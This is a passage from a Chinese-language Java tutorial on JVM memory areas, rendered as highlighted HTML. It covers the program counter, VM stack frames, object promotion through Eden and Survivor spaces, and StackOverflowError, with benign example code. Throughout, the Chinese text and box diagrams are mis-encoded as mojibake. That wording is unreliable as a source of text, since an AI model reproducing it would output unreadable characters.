            <span class="hljs-comment">// obj1å’Œobj2å¼•ç”¨å­˜å‚¨åœ¨æ ˆ3ä¸­ï¼ˆç§æœ‰åŒºåŸŸï¼‰</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> resource1;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource1</span>
            <span class="hljs-type">SharedResource</span> <span class="hljs-variable">obj2</span> <span class="hljs-operator">=</span> resource2;  <span class="hljs-comment">// å¼•ç”¨æŒ‡å‘å †ä¸­çš„resource2</span>
            
            <span class="hljs-comment">// é€šè¿‡å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡ï¼ˆå…±äº«åŒºåŸŸï¼‰</span>
            <span class="hljs-keyword">synchronized</span> (obj1) {
                obj1.doWork();
            }
            <span class="hljs-keyword">synchronized</span> (obj2) {
                obj2.doWork();
            }
        });
        
        thread1.start();
        thread2.start();
        thread3.start();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">SharedResource</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doWork</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å·¥ä½œä»£ç </span>
    }
}
</code></pre>
<p><strong>å…³é”®ç‚¹æ€»ç»“ï¼š</strong></p>
<ol>
<li><strong>ç§æœ‰åŒºåŸŸï¼ˆæ ˆï¼‰å­˜å‚¨å¼•ç”¨</strong>ï¼šå¯¹è±¡å¼•ç”¨å­˜å‚¨åœ¨æ ˆä¸­ï¼Œæ¯ä¸ªçº¿ç¨‹æœ‰è‡ªå·±çš„æ ˆ</li>
<li><strong>å…±äº«åŒºåŸŸï¼ˆå †ï¼‰å­˜å‚¨å¯¹è±¡</strong>ï¼šå¯¹è±¡æœ¬èº«å­˜å‚¨åœ¨å †ä¸­ï¼Œæ‰€æœ‰çº¿ç¨‹å¯ä»¥å…±äº«</li>
<li><strong>é€šè¿‡å¼•ç”¨è®¿é—®å¯¹è±¡</strong>ï¼šçº¿ç¨‹é€šè¿‡æ ˆä¸­çš„å¼•ç”¨è®¿é—®å †ä¸­çš„å¯¹è±¡</li>
<li><strong>éœ€è¦åŒæ­¥æœºåˆ¶</strong>ï¼šå¤šä¸ªçº¿ç¨‹è®¿é—®åŒä¸€ä¸ªå…±äº«å¯¹è±¡æ—¶ï¼Œéœ€è¦åŒæ­¥æœºåˆ¶ä¿è¯çº¿ç¨‹å®‰å…¨</li>
</ol>
<h4 data-id="heading-18">2.4 å†…å­˜åŒºåŸŸå¤§å°å…³ç³»å›¾</h4>
<pre><code class="hljs language-scss" lang="scss">å†…å­˜å¤§å°å…³ç³»ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚  Javaå †(æœ€å¤§)â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚   æ–¹æ³•åŒº    â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  è™šæ‹Ÿæœºæ ˆ   â”‚ (æ¯ä¸ªçº¿ç¨‹)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ ç¨‹åºè®¡æ•°å™¨  â”‚ (å¾ˆå°)
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚  ç›´æ¥å†…å­˜   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<p><strong>å¤§å°å…³ç³»è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>Javaå †</strong>ï¼šæœ€å¤§ï¼Œé€šå¸¸å JVMå†…å­˜çš„å¤§éƒ¨åˆ†ï¼ˆå¦‚-Xmxè®¾ç½®çš„å †å¤§å°ï¼‰</li>
<li><strong>æ–¹æ³•åŒº</strong>ï¼šä¸­ç­‰ï¼Œå­˜å‚¨ç±»ä¿¡æ¯ã€å¸¸é‡ç­‰ï¼ˆé€šå¸¸å‡ åMBåˆ°å‡ ç™¾MBï¼‰</li>
<li><strong>è™šæ‹Ÿæœºæ ˆ</strong>ï¼šè¾ƒå°ï¼Œæ¯ä¸ªçº¿ç¨‹çº¦1MBï¼ˆçº¿ç¨‹æ•° Ã— 1MBï¼‰</li>
<li><strong>ç¨‹åºè®¡æ•°å™¨</strong>ï¼šå¾ˆå°ï¼Œå¯ä»¥å¿½ç•¥</li>
<li><strong>ç›´æ¥å†…å­˜</strong>ï¼šå¤§å°å–å†³äºä½¿ç”¨æƒ…å†µ</li>
</ol>
<h4 data-id="heading-19">2.5 å¯¹è±¡åœ¨å†…å­˜ä¸­çš„æµè½¬å›¾</h4>
<pre><code class="hljs language-markdown" lang="markdown">å¯¹è±¡ç”Ÿå‘½å‘¨æœŸï¼š

åˆ›å»º â†’ EdenåŒº â†’ Minor GC â†’ SurvivoråŒº â†’ å¹´é¾„å¢é•¿ â†’ è€å¹´ä»£ â†’ Full GC â†’ å›æ”¶

è¯¦ç»†æµç¨‹ï¼š
<span class="hljs-bullet">1.</span> åˆ›å»ºå¯¹è±¡ â†’ EdenåŒº
<span class="hljs-bullet">2.</span> EdenåŒºæ»¡ â†’ Minor GC â†’ å­˜æ´»å¯¹è±¡ â†’ SurvivoråŒº
<span class="hljs-bullet">3.</span> å¤šæ¬¡GCå â†’ å¹´é¾„è¾¾åˆ°é˜ˆå€¼ â†’ è€å¹´ä»£
<span class="hljs-bullet">4.</span> è€å¹´ä»£æ»¡ â†’ Full GC â†’ å¯¹è±¡å›æ”¶
</code></pre>
<p><strong>æµè½¬è¿‡ç¨‹è¯´æ˜ï¼š</strong></p>
<ol>
<li><strong>å¯¹è±¡åˆ›å»º</strong>ï¼šæ–°å¯¹è±¡é¦–å…ˆåˆ†é…åœ¨EdenåŒº</li>
<li><strong>Minor GC</strong>ï¼šå½“EdenåŒºæ»¡æ—¶ï¼Œè§¦å‘Minor GCï¼Œå­˜æ´»å¯¹è±¡å¤åˆ¶åˆ°SurvivoråŒº</li>
<li><strong>SurvivoråŒºå¤åˆ¶</strong>ï¼šå¯¹è±¡åœ¨SurvivoråŒºçš„Fromå’ŒToä¹‹é—´æ¥å›å¤åˆ¶ï¼Œæ¯ç»å†ä¸€æ¬¡GCï¼Œå¹´é¾„+1</li>
<li><strong>æ™‹å‡è€å¹´ä»£</strong>ï¼šå¯¹è±¡å¹´é¾„è¾¾åˆ°é˜ˆå€¼ï¼ˆé»˜è®¤15ï¼‰åï¼Œæ™‹å‡åˆ°è€å¹´ä»£</li>
<li><strong>Full GC</strong>ï¼šè€å¹´ä»£æ»¡æ—¶ï¼Œè§¦å‘Full GCï¼Œå›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡</li>
</ol>
<p><strong>å®é™…ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ObjectLifecycle</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createObjects</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// 1. åˆ›å»ºå¯¹è±¡ â†’ åˆ†é…åœ¨EdenåŒº</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">obj1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// æ–°å¯¹è±¡åœ¨EdenåŒº</span>
        
        <span class="hljs-comment">// 2. å¦‚æœEdenåŒºæ»¡äº†ï¼Œè§¦å‘Minor GC</span>
        <span class="hljs-comment">// å­˜æ´»çš„å¯¹è±¡ä¼šè¢«å¤åˆ¶åˆ°SurvivoråŒº</span>
        
        <span class="hljs-comment">// 3. å¯¹è±¡åœ¨SurvivoråŒºä¹‹é—´å¤åˆ¶</span>
        <span class="hljs-comment">// æ¯æ¬¡GCï¼Œå¯¹è±¡å¹´é¾„+1</span>
        
        <span class="hljs-comment">// 4. å¹´é¾„è¾¾åˆ°é˜ˆå€¼ â†’ æ™‹å‡åˆ°è€å¹´ä»£</span>
        <span class="hljs-comment">// é»˜è®¤å¹´é¾„é˜ˆå€¼æ˜¯15</span>
        
        <span class="hljs-comment">// 5. è€å¹´ä»£æ»¡æ—¶ â†’ è§¦å‘Full GC</span>
        <span class="hljs-comment">// å›æ”¶ä¸å†ä½¿ç”¨çš„å¯¹è±¡</span>
    }
}
</code></pre>
<hr/>
<h2 data-id="heading-20">ç¬¬ä¸‰éƒ¨åˆ†ï¼šå„å†…å­˜åŒºåŸŸè¯¦è§£</h2>
<h3 data-id="heading-21">3. ç¨‹åºè®¡æ•°å™¨ï¼ˆProgram Counter Registerï¼‰</h3>
<h4 data-id="heading-22">3.1 ä½œç”¨</h4>
<p>ç¨‹åºè®¡æ•°å™¨æ˜¯ä¸€å—å¾ˆå°çš„å†…å­˜ç©ºé—´ï¼Œå®ƒå¯ä»¥çœ‹ä½œæ˜¯å½“å‰çº¿ç¨‹æ‰€æ‰§è¡Œçš„å­—èŠ‚ç çš„è¡Œå·æŒ‡ç¤ºå™¨ã€‚</p>
<p><strong>å…·ä½“ä½œç”¨ï¼š</strong></p>
<ul>
<li>è®°å½•å½“å‰çº¿ç¨‹æ‰§è¡Œçš„å­—èŠ‚ç æŒ‡ä»¤åœ°å€</li>
<li>çº¿ç¨‹ç§æœ‰ï¼Œæ¯ä¸ªçº¿ç¨‹ç‹¬ç«‹</li>
<li>åˆ†æ”¯ã€å¾ªç¯ã€è·³è½¬ã€å¼‚å¸¸å¤„ç†ã€çº¿ç¨‹æ¢å¤ç­‰éƒ½éœ€è¦ä¾èµ–ç¨‹åºè®¡æ•°å™¨æ¥å®Œæˆ</li>
</ul>
<p><strong>å·¥ä½œç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;      <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨æŒ‡å‘è¿™æ¡æŒ‡ä»¤</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;      <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨ç§»åŠ¨åˆ°ä¸‹ä¸€æ¡æŒ‡ä»¤</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;  <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨ç»§ç»­ç§»åŠ¨</span>
}
</code></pre>
<h4 data-id="heading-23">3.2 ç‰¹ç‚¹</h4>
<ol>
<li>
<p><strong>å”¯ä¸€ä¸ä¼šå‘ç”ŸOutOfMemoryErrorçš„åŒºåŸŸ</strong></p>
<ul>
<li>ç¨‹åºè®¡æ•°å™¨å ç”¨çš„å†…å­˜å¾ˆå°ï¼Œå‡ ä¹å¯ä»¥å¿½ç•¥</li>
<li>ä¸ä¼šå› ä¸ºç¨‹åºè®¡æ•°å™¨çš„åŸå› å¯¼è‡´å†…å­˜æº¢å‡º</li>
</ul>
</li>
<li>
<p><strong>çº¿ç¨‹ç§æœ‰</strong></p>
<ul>
<li>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„ç¨‹åºè®¡æ•°å™¨</li>
<li>çº¿ç¨‹ä¹‹é—´äº’ä¸å½±å“</li>
</ul>
</li>
<li>
<p><strong>æ‰§è¡ŒNativeæ–¹æ³•æ—¶å€¼ä¸ºç©º</strong></p>
<ul>
<li>å½“çº¿ç¨‹æ‰§è¡ŒJavaæ–¹æ³•æ—¶ï¼Œç¨‹åºè®¡æ•°å™¨è®°å½•çš„æ˜¯æ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€</li>
<li>å½“çº¿ç¨‹æ‰§è¡ŒNativeæ–¹æ³•ï¼ˆæœ¬åœ°æ–¹æ³•ï¼‰æ—¶ï¼Œç¨‹åºè®¡æ•°å™¨çš„å€¼ä¸ºç©ºï¼ˆundefinedï¼‰</li>
</ul>
</li>
</ol>
<p><strong>ç¤ºæ„å›¾ï¼š</strong></p>
<pre><code class="hljs">çº¿ç¨‹1ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç¨‹åºè®¡æ•°å™¨   â”‚
â”‚ åœ°å€ï¼š0x100  â”‚ â† æŒ‡å‘å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

çº¿ç¨‹2ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç¨‹åºè®¡æ•°å™¨   â”‚
â”‚ åœ°å€ï¼š0x200  â”‚ â† æŒ‡å‘å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆç‹¬ç«‹ï¼‰
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

çº¿ç¨‹3ï¼š
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ ç¨‹åºè®¡æ•°å™¨   â”‚
â”‚ åœ°å€ï¼š0x300  â”‚ â† æŒ‡å‘å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤ï¼ˆç‹¬ç«‹ï¼‰
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-24">3.3 å®é™…åº”ç”¨</h4>
<p><strong>1. çº¿ç¨‹åˆ‡æ¢æ—¶ä¿å­˜å’Œæ¢å¤æ‰§è¡Œä½ç½®</strong></p>
<p>å½“CPUä»ä¸€ä¸ªçº¿ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªçº¿ç¨‹æ—¶ï¼Œéœ€è¦ï¼š</p>
<ul>
<li>ä¿å­˜å½“å‰çº¿ç¨‹çš„ç¨‹åºè®¡æ•°å™¨å€¼</li>
<li>æ¢å¤ä¸‹ä¸€ä¸ªçº¿ç¨‹çš„ç¨‹åºè®¡æ•°å™¨å€¼</li>
<li>è¿™æ ·çº¿ç¨‹æ¢å¤æ—¶æ‰èƒ½ä»ä¸Šæ¬¡æ‰§è¡Œçš„ä½ç½®ç»§ç»­æ‰§è¡Œ</li>
</ul>
<p><strong>2. åˆ†æ”¯ã€å¾ªç¯ã€å¼‚å¸¸å¤„ç†ç­‰æ§åˆ¶æµçš„åŸºç¡€</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">example</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">x</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;
    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">5</span>) {        <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨è®°å½•ifåˆ¤æ–­çš„æŒ‡ä»¤åœ°å€</span>
        x = <span class="hljs-number">20</span>;         <span class="hljs-comment">// å¦‚æœæ¡ä»¶ä¸ºçœŸï¼Œè·³è½¬åˆ°è¿™é‡Œ</span>
    } <span class="hljs-keyword">else</span> {
        x = <span class="hljs-number">0</span>;          <span class="hljs-comment">// å¦‚æœæ¡ä»¶ä¸ºå‡ï¼Œè·³è½¬åˆ°è¿™é‡Œ</span>
    }
    
    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) {  <span class="hljs-comment">// ç¨‹åºè®¡æ•°å™¨è®°å½•å¾ªç¯çš„æŒ‡ä»¤åœ°å€</span>
        <span class="hljs-comment">// å¾ªç¯ä½“</span>
    }
}
</code></pre>
<h3 data-id="heading-25">4. Javaè™šæ‹Ÿæœºæ ˆï¼ˆJava Virtual Machine Stackï¼‰</h3>
<h4 data-id="heading-26">4.1 ä½œç”¨</h4>
<p>Javaè™šæ‹Ÿæœºæ ˆæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸çº¿ç¨‹ç›¸åŒã€‚è™šæ‹Ÿæœºæ ˆæè¿°çš„æ˜¯Javaæ–¹æ³•æ‰§è¡Œçš„å†…å­˜æ¨¡å‹ã€‚</p>
<p><strong>ä¸»è¦ä½œç”¨ï¼š</strong></p>
<ul>
<li>å­˜å‚¨å±€éƒ¨å˜é‡ã€æ–¹æ³•å‚æ•°ã€è¿”å›å€¼ã€ä¸­é—´ç»“æœç­‰</li>
<li>æ¯ä¸ªæ–¹æ³•åœ¨æ‰§è¡Œæ—¶éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼ˆStack Frameï¼‰ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€åŠ¨æ€é“¾æ¥ã€æ–¹æ³•å‡ºå£ç­‰ä¿¡æ¯</li>
<li>æ¯ä¸ªæ–¹æ³•ä»è°ƒç”¨åˆ°æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œå°±å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆä¸­ä»å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹</li>
</ul>
<p><strong>å®é™…ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;        <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œå­˜å‚¨åœ¨methodAçš„æ ˆå¸§ä¸­</span>
    methodB();        <span class="hljs-comment">// è°ƒç”¨methodBï¼Œåˆ›å»ºmethodBçš„æ ˆå¸§</span>
    <span class="hljs-comment">// methodBæ‰§è¡Œå®Œåï¼ŒmethodBçš„æ ˆå¸§å‡ºæ ˆ</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">2</span>;        <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œå­˜å‚¨åœ¨methodBçš„æ ˆå¸§ä¸­</span>
    methodC();        <span class="hljs-comment">// è°ƒç”¨methodCï¼Œåˆ›å»ºmethodCçš„æ ˆå¸§</span>
}

<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodC</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-number">3</span>;        <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œå­˜å‚¨åœ¨methodCçš„æ ˆå¸§ä¸­</span>
}

<span class="hljs-comment">// æ ˆå¸§ç»“æ„ï¼š</span>
<span class="hljs-comment">// â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”</span>
<span class="hljs-comment">// â”‚ methodCæ ˆå¸§ â”‚ â† æ ˆé¡¶ï¼ˆå½“å‰æ‰§è¡Œçš„æ–¹æ³•ï¼‰</span>
<span class="hljs-comment">// â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="hljs-comment">// â”‚ methodBæ ˆå¸§ â”‚</span>
<span class="hljs-comment">// â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤</span>
<span class="hljs-comment">// â”‚ methodAæ ˆå¸§ â”‚</span>
<span class="hljs-comment">// â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜</span>
</code></pre>
<h4 data-id="heading-27">4.2 æ ˆå¸§ç»“æ„å›¾</h4>
<pre><code class="hljs">æ ˆå¸§ç»“æ„ï¼š

â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ å±€éƒ¨å˜é‡è¡¨   â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ“ä½œæ•°æ ˆ     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ åŠ¨æ€é“¾æ¥     â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ æ–¹æ³•è¿”å›åœ°å€ â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
</code></pre>
<h4 data-id="heading-28">4.3 æ ˆå¸§å„éƒ¨åˆ†è¯¦è§£</h4>
<p><strong>1. å±€éƒ¨å˜é‡è¡¨ï¼ˆLocal Variablesï¼‰</strong></p>
<p>å±€éƒ¨å˜é‡è¡¨æ˜¯ä¸€ç»„å˜é‡å€¼å­˜å‚¨ç©ºé—´ï¼Œç”¨äºå­˜æ”¾æ–¹æ³•å‚æ•°å’Œæ–¹æ³•å†…éƒ¨å®šä¹‰çš„å±€éƒ¨å˜é‡ã€‚</p>
<p><strong>å­˜å‚¨å†…å®¹ï¼š</strong></p>
<ul>
<li>æ–¹æ³•å‚æ•°ï¼šä¼ å…¥æ–¹æ³•çš„å‚æ•°</li>
<li>å±€éƒ¨å˜é‡ï¼šæ–¹æ³•å†…éƒ¨å®šä¹‰çš„å˜é‡</li>
<li>å¯¹è±¡å¼•ç”¨ï¼šå¯¹è±¡çš„å¼•ç”¨ï¼ˆå¯¹è±¡æœ¬èº«åœ¨å †ä¸­ï¼‰</li>
</ul>
<p><strong>æ§½ï¼ˆSlotï¼‰çš„æ¦‚å¿µï¼š</strong></p>
<ul>
<li>å±€éƒ¨å˜é‡è¡¨ä»¥å˜é‡æ§½ï¼ˆSlotï¼‰ä¸ºæœ€å°å•ä½</li>
<li>32ä½æ•°æ®ç±»å‹ï¼ˆbooleanã€byteã€charã€shortã€intã€floatã€referenceï¼‰å ç”¨1ä¸ªSlot</li>
<li>64ä½æ•°æ®ç±»å‹ï¼ˆlongã€doubleï¼‰å ç”¨2ä¸ªSlot</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">(<span class="hljs-type">int</span> param1, <span class="hljs-type">long</span> param2)</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">local1</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;      <span class="hljs-comment">// å ç”¨1ä¸ªSlot</span>
    <span class="hljs-type">long</span> <span class="hljs-variable">local2</span> <span class="hljs-operator">=</span> <span class="hljs-number">20L</span>;    <span class="hljs-comment">// å ç”¨2ä¸ªSlot</span>
    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// å¼•ç”¨å ç”¨1ä¸ªSlotï¼Œå¯¹è±¡åœ¨å †ä¸­</span>
}
</code></pre>
<p><strong>2. æ“ä½œæ•°æ ˆï¼ˆOperand Stackï¼‰</strong></p>
<p>æ“ä½œæ•°æ ˆæ˜¯ä¸€ä¸ªåè¿›å…ˆå‡ºï¼ˆLIFOï¼‰çš„æ ˆï¼Œç”¨äºä¿å­˜è®¡ç®—è¿‡ç¨‹ä¸­çš„ä¸­é—´ç»“æœã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>ä¿å­˜è®¡ç®—è¿‡ç¨‹ä¸­çš„ä¸´æ—¶ç»“æœ</li>
<li>ä¸ºå…¶ä»–æŒ‡ä»¤æä¾›æ“ä½œæ•°</li>
<li>å­˜æ”¾æ–¹æ³•è°ƒç”¨çš„å‚æ•°å’Œè¿”å›å€¼</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">calculate</span><span class="hljs-params">()</span> {
    <span class="hljs-type">int</span> <span class="hljs-variable">a</span> <span class="hljs-operator">=</span> <span class="hljs-number">10</span>;      <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špush 10</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">b</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;      <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špush 20</span>
    <span class="hljs-type">int</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> a + b;   <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špop 20, pop 10, push 30</span>
    <span class="hljs-keyword">return</span> c;        <span class="hljs-comment">// æ“ä½œæ•°æ ˆï¼špop 30ä½œä¸ºè¿”å›å€¼</span>
}
</code></pre>
<p><strong>3. åŠ¨æ€é“¾æ¥ï¼ˆDynamic Linkingï¼‰</strong></p>
<p>åŠ¨æ€é“¾æ¥æŒ‡å‘è¿è¡Œæ—¶å¸¸é‡æ± ä¸­è¯¥æ ˆå¸§æ‰€å±æ–¹æ³•çš„å¼•ç”¨ã€‚</p>
<p><strong>ä½œç”¨ï¼š</strong></p>
<ul>
<li>åœ¨æ–¹æ³•è°ƒç”¨æ—¶ï¼Œå°†ç¬¦å·å¼•ç”¨è½¬æ¢ä¸ºç›´æ¥å¼•ç”¨</li>
<li>æ”¯æŒå¤šæ€ï¼šåœ¨è¿è¡Œæ—¶ç¡®å®šå®é™…è°ƒç”¨çš„æ–¹æ³•</li>
</ul>
<p><strong>4. æ–¹æ³•è¿”å›åœ°å€ï¼ˆReturn Addressï¼‰</strong></p>
<p>æ–¹æ³•è¿”å›åœ°å€å­˜å‚¨æ–¹æ³•é€€å‡ºåè¿”å›åˆ°å“ªæ¡æŒ‡ä»¤ç»§ç»­æ‰§è¡Œã€‚</p>
<p><strong>ä¸¤ç§æƒ…å†µï¼š</strong></p>
<ul>
<li><strong>æ­£å¸¸è¿”å›</strong>ï¼šæ–¹æ³•æ­£å¸¸æ‰§è¡Œå®Œæ¯•ï¼Œè¿”å›åˆ°è°ƒç”¨è€…çš„ä¸‹ä¸€æ¡æŒ‡ä»¤</li>
<li><strong>å¼‚å¸¸è¿”å›</strong>ï¼šæ–¹æ³•æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ›å‡ºå¼‚å¸¸ï¼Œé€šè¿‡å¼‚å¸¸å¤„ç†è¡¨ç¡®å®šè¿”å›åœ°å€</li>
</ul>
<h4 data-id="heading-29">4.4 æ ˆçš„å¼‚å¸¸</h4>
<p><strong>1. StackOverflowErrorï¼ˆæ ˆæº¢å‡ºé”™è¯¯ï¼‰</strong></p>
<p>å½“çº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦è¶…è¿‡è™šæ‹Ÿæœºå…è®¸çš„æœ€å¤§æ·±åº¦æ—¶ï¼Œä¼šæŠ›å‡ºStackOverflowErrorã€‚</p>
<p><strong>äº§ç”ŸåŸå› ï¼š</strong></p>
<ul>
<li>é€’å½’è°ƒç”¨è¿‡æ·±</li>
<li>å±€éƒ¨å˜é‡è¿‡å¤š</li>
<li>æ–¹æ³•è°ƒç”¨é“¾è¿‡é•¿</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StackOverflow</span> {
    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> <span class="hljs-variable">count</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">recursive</span><span class="hljs-params">()</span> {
        count++;  <span class="hljs-comment">// æ¯æ¬¡é€’å½’ï¼Œåˆ›å»ºä¸€ä¸ªæ–°çš„æ ˆå¸§</span>
        recursive();  <span class="hljs-comment">// æ— é™é€’å½’ï¼Œæ ˆå¸§ä¸æ–­å…¥æ ˆï¼Œæœ€ç»ˆæ ˆæº¢å‡º</span>
    }
}
</code></pre>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong></p>
<ul>
<li>ä¼˜åŒ–é€’å½’ç®—æ³•ï¼Œæ”¹ä¸ºè¿­ä»£</li>
<li>å‡å°‘å±€éƒ¨å˜é‡</li>
<li>å¢åŠ æ ˆå¤§å°ï¼ˆ-Xsså‚æ•°ï¼‰</li>
</ul>
<p><strong>2. OutOfMemoryErrorï¼ˆå†…å­˜æº¢å‡ºé”™è¯¯ï¼‰</strong></p>
<p>å¦‚æœè™šæ‹Ÿæœºæ ˆå¯ä»¥åŠ¨æ€æ‰©å±•ï¼Œå½“æ‰©å±•æ—¶æ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿçš„å†…å­˜æ—¶ï¼Œä¼šæŠ›å‡ºOutOfMemoryErrorã€‚</p>
